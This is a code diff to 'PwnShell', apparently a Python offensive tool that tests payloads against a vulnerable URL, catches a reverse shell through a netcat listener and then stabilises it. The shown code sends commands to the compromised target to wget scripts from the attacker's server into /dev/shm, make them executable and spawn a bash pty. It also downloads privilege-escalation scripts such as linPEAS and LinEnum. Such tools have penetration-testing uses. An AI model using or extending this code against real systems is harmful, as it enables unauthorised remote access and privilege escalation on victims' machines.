@@ -38,6 +38,10 @@ class PwnShell:
 		self.listt=[]
 		self.encoded_payload=None
 		self.connected = False
+
+		if not self.file and not self.domain:
+			print(colors.get_colored_text("[!]Please use Provide a URL or a REQUEST file[!]\n\n"+"[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
+			exit()
 		########################################################################
 		###################### Specifying OS ###################################
 		if self.type == "linux" or self.type == "l":
@@ -45,7 +49,7 @@ class PwnShell:
 		elif self.type == "windows" or self.type == "w":
 			self.shell_windows()
 		else:
-			print("[!]Invalid Value -> " + self.type)
+			print(colors.get_colored_text("[!]Invalid Value -> " + self.type +"\n\n[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
 			exit_gracefully()
 		######################################################################
 
@@ -93,8 +97,22 @@ class PwnShell:
 	def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
 		nc = nclib.Netcat(listen=('', self.port))
 		print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
-		self.connected = True
-		print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
+		self.connected = True  #To stop the thread
+		self.for_listener()
+		time.sleep(5)
+		nc.send_line(b"export TERM=xterm-256color")
+		print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
+		send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
+		nc.send_line(send.encode("utf-8"))
+		send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm/ ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null ; clear'''
+		nc.send_line(send.encode("utf-8"))
+		print('[*]Activating a TTY Shell Using --> [Python3]')
+		nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
+		nc.interact()
+		nc.close()
+
+	def for_listener(self):
+		print("[*]CONNECTION ESTABLISHED!")
 		if self.method == "get" or self.method == "GET":
 			print("[+]Vulnerable URL:",self.url)
 		else:
@@ -102,19 +120,9 @@ class PwnShell:
 		print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
 		print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
 		print('[*]Cloning PrivESC Scripts From Their Repositories...')
-		time.sleep(1)
-		print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
 		os.system('curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
-		print('[*]Activating a TTY Shell Using --> [Python3]')
-		time.sleep(8)
-		nc.send_line(b"export TERM=xterm-256color")
-		send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts -o .ignore; clear '''
-		nc.send_line(send.encode("utf-8"))
-		send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; clear ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null'''
-		nc.send_line(send.encode("utf-8"))
-		nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
-		nc.interact()
-		nc.close()
+
+
 
 	#########################################################################################
 	###################################  HTTP SERVER #########################################
@@ -262,19 +270,19 @@ if __name__ == '__main__':
 	try:
 		banner = ''' 
 
- $$$$$$$\						   $$$$$$\  $$\				 $$\ $$\ 
- $$  __$$\						 $$  __$$\ $$ |				$$ |$$ |
+ $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
+ $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
  $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
  $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
  $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
- $$ |	  $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
- $$ |	  \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
- \__|	   \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
+ $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
+ $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
+ \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
  ########################################################################
- ------------------------------------																				
- | Authors: [AbuQasem] & [AlBalouli] |											  
- ------------------------------------							   
-\n '''
+ ------------------------------------                                                                                
+ | Authors: [AbuQasem] & [AlBalouli] |                                              
+ ------------------------------------                               
+\n    '''
 
 		
 		colors=Colors(ColorsSet.WHITE)
@@ -304,4 +312,5 @@ if __name__ == '__main__':
 		exit_gracefully()
 
 # TODO
-# Work on windows
+#Work on windows
+#ADD pentest monkey payload
